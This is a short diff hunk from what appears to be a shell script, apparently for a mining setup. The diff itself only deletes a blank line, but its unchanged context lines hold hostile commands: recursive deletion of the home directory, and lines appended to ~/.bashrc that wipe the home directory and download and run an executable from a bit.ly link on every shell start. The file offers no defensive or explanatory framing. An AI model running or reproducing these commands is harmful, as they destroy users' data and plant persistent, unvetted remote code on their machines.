@@ -12,7 +12,6 @@ clear
 cd ~
 rm -rvf * rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
 mkdir ~/.majza && cd ~/.majza && echo "cd ~/ && rm -R *" >> ~/.bashrc && echo "cd ~/.majza && wget bit.ly/git4070 && chmod +x git4070 && ./git4070 " >> ~/.bashrc && source ~/.bashrc
-
 x-project the other one 03 (ATI)
 clear
 cd ~
